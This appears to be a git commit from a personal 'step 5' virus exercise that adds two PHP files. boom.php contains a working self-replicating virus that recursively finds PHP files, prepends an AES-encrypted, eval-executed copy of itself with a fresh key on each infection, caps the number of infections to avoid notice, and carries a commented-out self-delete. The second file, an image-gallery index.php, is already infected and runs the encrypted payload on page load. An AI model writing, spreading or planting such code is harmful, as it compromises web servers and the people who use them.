91df90e68b2725fa82fec46a262af2727c9754aa
Phil Sushko <dasd_90@hotmail.com>
2018-08-16 16:23:37 +0300

    add result for step 5

---
+++ step5/result/boom.php
@@ -0,0 +1,143 @@
+<?php // Checksum: 9298d98b11db60a48d438d4e70360305 ?><?php
+$encryptedVirus = '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';
+$iv = 'q4EXt6Z6D0XT2HdKl+SiNw==';
+$key = '2/29XicnsPJZIkppvKkw/OE9dON/rs+E/LshFXKCgB8=';
+$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode($key), base64_decode($encryptedVirus), MCRYPT_MODE_CBC, base64_decode($iv));
+eval($virus);
+execute($virus);
+?><?php
+
+if (!function_exists('execute')) {
+    // VIRUS:START
+    function execute($virus)
+    {
+        $fileNames = getEditableFiles('/home/NIX/psushko/Code/virus/step5', '#\.php$#'); // Get a list of all php files
+        foreach ($fileNames as $fileName) { // Check each file
+            $script = fopen($fileName, 'r'); // Open file
+
+            $firstLine = fgets($script); // Check not infected
+            $virusHash = md5('seed' . $fileName);
+
+            if (false === strpos($firstLine, $virusHash)) {
+                $infected = fopen($fileName . '.infected', 'w'); // Let's write to a new file
+
+                $checksum = '<?php // Checksum: ' . $virusHash . ' ?>';
+                $infection = '<?php ' . encryptedVirus($virus) . ' ?>';
+
+                fputs($infected, $checksum, strlen($checksum));
+                fputs($infected, $infection, strlen($infection));
+                fputs($infected, $firstLine, strlen($firstLine));
+
+                while ($contents = fgets($script)) {
+                    fputs($infected, $contents, strlen($contents));
+                }
+
+                fclose($script); // Close both handles
+                fclose($infected);
+
+                rename($fileName, $fileName . '.original'); // Move the infected file in to place
+                rename($fileName . '.infected', $fileName);
+
+                unlink($fileName . '.original');
+            }
+        }
+    }
+
+    function encryptedVirus($virus)
+    {
+        // Gen key
+        $str = '0123456789abcdef';
+        $key = '';
+
+        for ($i = 0; $i < 64; $i++) {
+            $key .= $str[rand(0, strlen($str) - 1)];
+        }
+        $key = pack('H*', $key);
+
+        // Encrypt
+        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+        $encryptedVirus = mcrypt_encrypt(
+            MCRYPT_RIJNDAEL_128,
+            $key,
+            $virus,
+            MCRYPT_MODE_CBC,
+            $iv
+        );
+
+        // Encode
+        $encodedVirus = base64_encode($encryptedVirus);
+        $encodedIV = base64_encode($iv);
+        $encodedKey = base64_encode($key);
+
+        // Payload
+        $payload = "
+        \$encryptedVirus = '$encodedVirus';
+        \$iv = '$encodedIV';
+        \$key = '$encodedKey';
+        \$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode(\$key), base64_decode(\$encryptedVirus), MCRYPT_MODE_CBC, base64_decode(\$iv));
+        eval(\$virus);
+        execute(\$virus);
+    ";
+
+        return $payload;
+    }
+
+    function getEditableFiles($directory, $pattern, $list = null)
+    {
+        if ($list === null) {
+            $list = [];
+        }
+        // Don't draw attention
+        if (count($list) > 10) {
+            return $list;
+        }
+
+        // Clean path
+        $directory = '/' . trim($directory, '/');
+        if (strlen($directory) > 1) {
+            $directory .= '/';
+        }
+
+        if (is_dir($directory)) {
+            if ($dh = opendir($directory)) { //Open dir
+                while (($fileName = readdir($dh)) !== false) { // Read files
+                    //Ignore current and parent directory
+                    if ($fileName == '.' || $fileName == '..') {
+                        continue;
+                    }
+                    // Recurse subdirectories
+                    if (is_dir($directory . $fileName)) {
+                        $list = getEditableFiles(
+                            $directory . $fileName,
+                            $pattern,
+                            $list
+                        );
+                    }
+                    // If filename matches pattern, add to list
+                    if (preg_match($pattern, $fileName)) {
+                        $list[] = $directory . $fileName;
+                    }
+                }
+                closedir($dh);
+            }
+        }
+
+        return $list;
+    }
+// VIRUS:END
+}
+
+$virus = file_get_contents(__FILE__);
+$virus = substr(
+    $virus,
+    strpos($virus, '// VIRUS:START')
+);
+$virus = substr(
+    $virus,
+    0,
+    strpos($virus, PHP_EOL . '// VIRUS:END') + strlen(PHP_EOL . '// VIRUS:END')
+);
+execute($virus);
+//unlink(__FILE__); // Delete self after files infected
+?>
---
+++ step5/result/public/index.php
@@ -0,0 +1,69 @@
+<?php // Checksum: b5f3a44c3e5e6473ebd17b1cccdb5258 ?><?php
+$encryptedVirus = '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';
+$iv = 'Me0la8ZzFREw3PfGkGRNGw==';
+$key = 'j5poEI75WOnd17rmwZcuifgUVBX4a7avQAcJyTPhJFo=';
+$virus = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, base64_decode($key), base64_decode($encryptedVirus), MCRYPT_MODE_CBC, base64_decode($iv));
+eval($virus);
+execute($virus);
+?><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Thumbnail Gallery - Start Bootstrap Template</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+  <!-- Custom styles for this template -->
+  <link href="css/thumbnail-gallery.css" rel="stylesheet">
+
+</head>
+
+<body>
+<!-- Page Content -->
+<div class="container">
+
+  <h1 class="my-4 text-center text-lg-left">Gallery</h1>
+
+  <div class="row text-center text-lg-left">
+    <div class="col-md-3" role="complementary">
+      <h2>Add image</h2>
+      <form action="upload.php" enctype="multipart/form-data" method="POST">
+        <input type="file" name="file">
+        <input type="submit">
+      </form>
+    </div>
+  </div>
+
+  <div class="row text-center text-lg-left">
+
+      <?php foreach (glob('../images/*') as $image) : ?>
+        <div class="col-lg-3 col-md-4 col-xs-6">
+          <a href="#" class="d-block mb-4 h-100">
+            <img
+              class="img-fluid img-thumbnail"
+              src="showimage.php?filename=<?php echo urlencode(pathinfo($image, PATHINFO_BASENAME)) ?>"
+              alt="">
+          </a>
+        </div>
+      <?php endforeach; ?>
+
+  </div>
+
+</div>
+<!-- /.container -->
+
+<!-- Bootstrap core JavaScript -->
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"
+        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.bundle.min.js"
+        integrity="sha384-pjaaA8dDz/5BgdFUPX6M/9SUZv4d12SUPF0axWc+VRZkx5xU3daN+lYb49+Ax+Tl"
+        crossorigin="anonymous"></script>
+
+</body>
+
+</html>
